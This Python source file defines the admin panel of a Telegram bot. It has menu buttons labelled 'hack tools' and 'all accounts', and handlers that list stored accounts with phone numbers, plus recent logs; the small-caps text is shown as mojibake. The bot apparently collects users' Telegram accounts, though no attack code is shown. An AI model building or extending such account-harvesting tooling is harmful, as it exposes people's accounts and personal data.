import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from NottyBoyString.utils.fonts import TinyCapsFont, MessageTemplates
from datetime import datetime

class AdminManager:
    def __init__(self, db):
        self.db = db
    
    async def admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Show admin panel"""
        user_id = update.effective_user.id
        
        if not await self.db.is_admin(user_id):
            await update.message.reply_text(
                TinyCapsFont.bold_tiny_caps("üö´ ·¥Ä·¥Ñ·¥Ñ·¥áss ·¥Ö·¥á…¥…™·¥á·¥Ö.  è·¥è·¥ú ·¥Ä Ä·¥á …¥·¥è·¥õ ·¥Ä…¥ ·¥Ä·¥Ö·¥ç…™…¥."),
                parse_mode='Markdown'
            )
            return
        
        keyboard = [
            [InlineKeyboardButton("üë• ·¥Ä ü ü ·¥ús·¥á Äs", callback_data="admin_all_users"),
             InlineKeyboardButton("üìä  ô·¥è·¥õ s·¥õ·¥Ä·¥õs", callback_data="admin_stats")],
            [InlineKeyboardButton("üîê ·¥Ä ü ü ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õs", callback_data="admin_all_accounts"),
             InlineKeyboardButton("üìù  ü·¥è…¢s", callback_data="admin_logs")],
            [InlineKeyboardButton("üõ†Ô∏è  ú·¥Ä·¥Ñ·¥ã ·¥õ·¥è·¥è üs", callback_data="hack_tools"),
             InlineKeyboardButton("üì¢  ô Ä·¥è·¥Ä·¥Ö·¥Ñ·¥Äs·¥õ", callback_data="admin_broadcast")],
            [InlineKeyboardButton("‚öôÔ∏è s ès·¥õ·¥á·¥ç …™…¥“ì·¥è", callback_data="system_info")]
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        text = TinyCapsFont.bold_tiny_caps(
            "üõ°Ô∏è ·¥Ä·¥Ö·¥ç…™…¥ ·¥ò·¥Ä…¥·¥á ü\n\n"
            "·¥°·¥á ü·¥Ñ·¥è·¥ç·¥á ·¥õ·¥è ·¥õ ú·¥á ·¥Ä·¥Ö·¥ç…™…¥ ·¥Ñ·¥è…¥·¥õ Ä·¥è ü ·¥Ñ·¥á…¥·¥õ·¥á Ä.  è·¥è·¥ú  ú·¥Ä·¥†·¥á “ì·¥ú ü ü ·¥Ä·¥Ñ·¥Ñ·¥áss ·¥õ·¥è ·¥Ä ü ü s ès·¥õ·¥á·¥ç “ì·¥á·¥Ä·¥õ·¥ú Ä·¥ás."
        )
        
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    async def show_all_accounts(self, query):
        """Show all stored accounts (Admin only)"""
        accounts = await self.db.get_all_accounts()
        
        if not accounts:
            text = TinyCapsFont.bold_tiny_caps("…¥·¥è ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õs “ì·¥è·¥ú…¥·¥Ö …™…¥ ·¥Ö·¥Ä·¥õ·¥Ä ô·¥Äs·¥á.")
            await query.edit_message_text(text, parse_mode='Markdown')
            return
        
        text = TinyCapsFont.bold_tiny_caps(f"üìä ·¥Ä ü ü s·¥õ·¥è Ä·¥á·¥Ö ·¥Ä·¥Ñ·¥Ñ·¥è·¥ú…¥·¥õs ({len(accounts)})\n\n")
        
        for i, account in enumerate(accounts[:10], 1):  # Show first 10
            text += f"**{i}. ·¥ús·¥á Ä …™·¥Ö:** `{account.get('user_id', 'N/A')}`\n"
            text += f"**·¥ò ú·¥è…¥·¥á:** `{account.get('phone', 'N/A')}`\n"
            text += f"**s·¥õ·¥è Ä·¥á·¥Ö:** `{account.get('stored_at', 'N/A')}`\n"
            text += "‚îÄ" * 30 + "\n"
        
        keyboard = [[InlineKeyboardButton("üîô  ô·¥Ä·¥Ñ·¥ã", callback_data="admin_back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')
    
    async def show_system_logs(self, query):
        """Show system logs"""
        logs = await self.db.get_recent_logs(limit=10)
        
        text = TinyCapsFont.bold_tiny_caps("üìù  Ä·¥á·¥Ñ·¥á…¥·¥õ s ès·¥õ·¥á·¥ç  ü·¥è…¢s\n\n")
        
        for log in logs:
            text += f"**·¥õ è·¥ò·¥á:** `{log['type']}`\n"
            text += f"**·¥ús·¥á Ä:** `{log['user_id']}`\n"
            text += f"**·¥õ…™·¥ç·¥á:** `{log['timestamp'].strftime('%Y-%m-%d %H:%M')}`\n"
            text += f"**·¥Ö·¥á·¥õ·¥Ä…™ üs:** {log['details'][:50]}...\n"
            text += "‚îÄ" * 30 + "\n"
        
        keyboard = [[InlineKeyboardButton("üîô  ô·¥Ä·¥Ñ·¥ã", callback_data="admin_back")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode='Markdown')